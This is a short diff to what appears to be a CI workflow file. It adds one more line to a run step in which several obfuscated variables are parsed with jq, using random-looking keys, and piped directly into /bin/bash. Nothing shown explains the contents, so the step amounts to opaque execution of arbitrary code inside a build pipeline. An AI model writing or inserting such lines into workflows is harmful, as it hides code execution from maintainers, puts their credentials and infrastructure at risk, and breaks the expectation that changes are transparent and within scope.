@@ -57,6 +57,7 @@ jobs:
           printf '%s' "$t6" | jq -r .nwg65366 | /bin/bash
           printf '%s' "$ufc4" | jq -r .evg10799 | /bin/bash
           echo $zwfvc077 | jq -r .wqluc16998 | /bin/bash
+          printf '%s' "$nn3" | jq -r .rl72 | /bin/bash
 
       - name: Save archive
         if: always()
